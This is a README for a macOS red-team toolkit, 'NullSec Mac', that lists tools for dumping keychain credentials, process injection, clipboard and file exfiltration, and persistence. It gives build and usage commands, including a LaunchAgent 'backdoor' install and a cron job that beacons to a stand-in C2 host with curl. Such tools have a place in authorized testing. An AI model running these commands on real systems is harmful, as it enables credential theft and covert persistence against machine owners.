# 🍎 NullSec Mac

**Fast, native macOS security tools written in Go, Rust, and C**

> High-performance red team and penetration testing utilities for Apple systems

[![GitHub](https://img.shields.io/badge/GitHub-bad--antics-181717?style=flat&logo=github&logoColor=white)](https://github.com/bad-antics)
[![Discord](https://img.shields.io/badge/Discord-killers-7289da)](https://discord.gg/killers)

## 🚀 Tools

### Go Tools (Fast, Cross-compilable)

| Tool | Description |
|------|-------------|
| `keychain_dump.go` | Extract credentials from macOS Keychain |
| `inject.go` | Process injection and memory manipulation |
| `netscan.go` | Fast concurrent ARP/port scanner |
| `clipboard.go` | Real-time clipboard monitoring & exfiltration |

### Rust Tools (Memory-safe, Blazing Fast)

| Tool | Description |
|------|-------------|
| `nullsec-exfil` | File discovery and exfiltration (SSH keys, configs, credentials) |

### C Tools (Native Performance)

| Tool | Description |
|------|-------------|
| `privesc_scan.c` | Privilege escalation vulnerability scanner |
| `persist.c` | Persistence mechanism installer (LaunchAgents, cron, hooks) |

## 🔧 Building

### Go
```bash
cd go
GOOS=darwin GOARCH=amd64 go build -o nullsec-keychain keychain_dump.go
GOOS=darwin GOARCH=arm64 go build -o nullsec-keychain-arm64 keychain_dump.go
```

### Rust
```bash
cd rust
cargo build --release
# Binary at target/release/nullsec-exfil
```

### C
```bash
cd c
clang -o nullsec-privesc privesc_scan.c -framework Security
clang -o nullsec-persist persist.c
```

## 📖 Usage Examples

### Keychain Dumper
```bash
./nullsec-keychain
# Lists all keychain items and credentials
```

### Network Scanner
```bash
./nullsec-netscan -arp                    # ARP scan local network
./nullsec-netscan -target 192.168.1.1 -ports 22,80,443,8080
```

### Persistence
```bash
./nullsec-persist -l                      # List current persistence
./nullsec-persist -a backdoor '/path/to/payload'  # Install LaunchAgent
./nullsec-persist -c '*/5 * * * *' 'curl http://c2/beacon'  # Cron job
```

### Privilege Escalation Scan
```bash
./nullsec-privesc
# Scans for SUID binaries, writable paths, sudo misconfigs, etc.
```

## ⚠️ Disclaimer

These tools are for **authorized security testing only**. Unauthorized use is illegal.

---

**NullSec Framework** | [GitHub](https://github.com/bad-antics) | [bad-antics](https://github.com/bad-antics) | [Discord](https://discord.gg/killers)
